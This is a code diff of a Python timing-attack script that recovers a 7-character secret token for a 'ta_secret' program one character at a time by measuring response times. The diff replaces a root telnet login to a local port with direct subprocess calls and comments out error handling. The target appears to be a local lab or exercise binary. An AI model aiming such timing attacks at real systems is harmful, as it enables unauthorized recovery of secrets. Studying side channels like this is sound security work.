@@ -2,13 +2,16 @@ import sys
 import time
 import string
 import statistics
-import pexpect
+
+import subprocess
 
 TELNET_HOST = "127.0.0.1"
 TELNET_PORT = 5555
 N = 1 # Number of requests to make for each guess
 TOKEN_SIZE = 7 # Size of the token to guess
-TA_COMMAND = "ta_secret -a 0 1"  
+TA_APP = "ta_secret"  # Command to test the token
+TA_COMMAND = "-a 0 0"
+
 
 # Global child process 
 child = None
@@ -24,8 +27,8 @@ def try_to_hack(characters):
     global child
     timings = []
     
-    for _ in range(N):
-        try:
+    for _ in range(1):
+        # try:
                        
             """ # Check if child is still alive
             if not child.isalive():
@@ -34,36 +37,37 @@ def try_to_hack(characters):
                 continue """
                         
             start = time.time()
-            child.sendline(f"{TA_COMMAND} {characters}")
-            child.expect("#")
+            # child.sendline(f"{TA_COMMAND} {characters}")
+            # child.expect("#")
+            subprocess.call([TA_APP, TA_COMMAND, characters])
             end = time.time()
             timings.append(end - start)
-            output = child.before.decode("utf-8", errors="ignore")
+            # output = child.before.decode("utf-8", errors="ignore")
             print(f"{TA_COMMAND} {characters}: time={end - start:.4f}")
 
             
             # Check if successful (adjust based on your app's output)
-            if ("success" in output.lower() or "correct" in output.lower()) and "wrong" not in output.lower():
-                raise PasswordFound(characters)
+            # if ("success" in output.lower() or "correct" in output.lower()) and "wrong" not in output.lower():
+            #     raise PasswordFound(characters)
             
-        except pexpect.TIMEOUT:
-            print(f"Timeout during connection")
-            timings.append(float('inf'))
-            # Try to recover
-            try:
-                child.sendcontrol('c')
-                child.expect("#", timeout=2)
-            except:
-                pass
-        except pexpect.EOF:
-            print(f"Connection closed unexpectedly")
-            timings.append(float('inf'))
-            break
-        except PasswordFound:
-            raise
-        except Exception as e:
-            print(f"[!] Error: {e}")
-            timings.append(float('inf'))
+        # except pexpect.TIMEOUT:
+        #     print(f"Timeout during connection")
+        #     timings.append(float('inf'))
+        #     # Try to recover
+        #     try:
+        #         child.sendcontrol('c')
+        #         child.expect("#", timeout=2)
+        #     except:
+        #         pass
+        # except pexpect.EOF:
+        #     print(f"Connection closed unexpectedly")
+        #     timings.append(float('inf'))
+        #     break
+        # except PasswordFound:
+        #     raise
+        # except Exception as e:
+        #     print(f"[!] Error: {e}")
+        #     timings.append(float('inf'))
     
     return timings
 
@@ -126,41 +130,41 @@ def find_next_character(base):
 def main():
     global child
     
-    print("Starting timing attack on ta_secret")
-    print(f"Target: {TELNET_HOST}:{TELNET_PORT}")
-    print(f"Token size: {TOKEN_SIZE}")
-    print(f"Samples per guess: {N}")
-    print(f"Command: {TA_COMMAND}")
+    # print("Starting timing attack on ta_secret")
+    # print(f"Target: {TELNET_HOST}:{TELNET_PORT}")
+    # print(f"Token size: {TOKEN_SIZE}")
+    # print(f"Samples per guess: {N}")
+    # print(f"Command: {TA_COMMAND}")
     
-    # Initial connection
-    print("\nConnecting.........\n")
-    try:
-        child = pexpect.spawn(f"telnet {TELNET_HOST} {TELNET_PORT}", timeout=30)
+    # # Initial connection
+    # print("\nConnecting.........\n")
+    # try:
+    #     child = pexpect.spawn(f"telnet {TELNET_HOST} {TELNET_PORT}", timeout=30)
         
-        # Enable logging to stdout
-        #child.logfile_read = sys.stdout.buffer
+    #     # Enable logging to stdout
+    #     #child.logfile_read = sys.stdout.buffer
     
-        child.sendline("")        
-        child.expect("login:")
-        child.sendline("root")
+    #     child.sendline("")        
+    #     child.expect("login:")
+    #     child.sendline("root")
 
-        print("\nlogged in\n")
+    #     print("\nlogged in\n")
 
-        child.expect("#")
+    #     child.expect("#")
 
                
-    except Exception as e:
-        print(f"Initial connection failed! : {e}")
-        return
+    # except Exception as e:
+    #     print(f"Initial connection failed! : {e}")
+    #     return
     
     base = ""
     print("will start to try to hack\n")
     
     try:
-        while len(base) < TOKEN_SIZE:
-            next_char = find_next_character(base)
-            base += next_char
-            print(f"\nCurrent guess: {base}\n")
+        # while len(base) < TOKEN_SIZE:
+        next_char = find_next_character(base)
+        base += next_char
+        print(f"\nCurrent guess: {base}\n")
             
     except PasswordFound as pf:
         print(f"\nPassword found: {pf.password}")
